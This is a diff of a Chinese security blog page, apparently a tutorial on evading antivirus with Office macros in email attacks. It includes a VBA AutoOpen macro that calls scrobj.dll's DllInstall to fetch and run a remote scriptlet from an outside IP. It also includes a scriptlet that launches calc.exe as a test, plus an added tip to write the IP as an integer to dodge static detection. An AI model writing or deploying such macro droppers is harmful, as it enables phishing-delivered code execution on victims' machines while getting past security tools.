@@ -13,10 +13,12 @@
 <meta property="og:site_name" content="wolvez&#39;s blog">
 <meta property="og:description" content="免杀没有绝对,各家杀软的策略都不一样,只有真正掌握各种机制才能更灵活的对抗杀软.   为什么用宏: 宏不是漏洞,是office重要功能,很多办公自动化离不开宏 宏代码更灵活,能调用系统api,脚本变形容易,很容易就能绕过杀软  技术点:   宏代码,不执行regsvr32命令 远程调用sct文件,实现免杀 csharp 可执行转js ,反序列化加载  原理: 宏调用DllInstall api">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2020-12-09T17:30:57.990Z">
+<meta property="og:image" content="https://wolvez.oss-cn-hangzhou.aliyuncs.com/2089f101aa3ab95e4822e905b02b7f6d.png">
+<meta property="og:updated_time" content="2020-12-17T12:23:24.411Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="邮件攻防--宏免杀姿势1">
 <meta name="twitter:description" content="免杀没有绝对,各家杀软的策略都不一样,只有真正掌握各种机制才能更灵活的对抗杀软.   为什么用宏: 宏不是漏洞,是office重要功能,很多办公自动化离不开宏 宏代码更灵活,能调用系统api,脚本变形容易,很容易就能绕过杀软  技术点:   宏代码,不执行regsvr32命令 远程调用sct文件,实现免杀 csharp 可执行转js ,反序列化加载  原理: 宏调用DllInstall api">
+<meta name="twitter:image" content="https://wolvez.oss-cn-hangzhou.aliyuncs.com/2089f101aa3ab95e4822e905b02b7f6d.png">
     
     
         
@@ -147,6 +149,10 @@
 <p>原理: 宏调用DllInstall api</p>
 <figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> Declare PtrSafe <span class="keyword">Function</span> DllInstall Lib <span class="string">"scrobj.dll"</span> (<span class="keyword">ByVal</span> bInstall As Boolean, <span class="keyword">ByRef</span> pszCmdLine As Any) As Long</span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    DllInstall <span class="literal">False</span>, <span class="keyword">ByVal</span> StrPtr(<span class="string">"http://10.2.37.64/y.sct"</span>) <span class="comment">' False = "Don't install"</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>tips:  ip 可转换成int 类型, 不影响访问,可能还能逃避一些静态检测</p>
+</blockquote>
+<p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/2089f101aa3ab95e4822e905b02b7f6d.png" alt="2020-12-17-20-23-02"></p>
 <h3 id="0x01-初步测试弹计算器"><a href="#0x01-初步测试弹计算器" class="headerlink" title="0x01 初步测试弹计算器"></a>0x01 初步测试弹计算器</h3><p>y.sct 内容</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span>         </span></span><br><span class="line"><span class="tag"><span class="attr">progid</span>=<span class="string">"Pentest"</span>       </span></span><br><span class="line"><span class="tag"><span class="attr">classid</span>=<span class="string">"&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;![CDATA[   </span><br><span class="line"><span class="javascript"><span class="keyword">var</span> r = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"calc.exe"</span>); </span></span><br><span class="line">]]&gt;</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
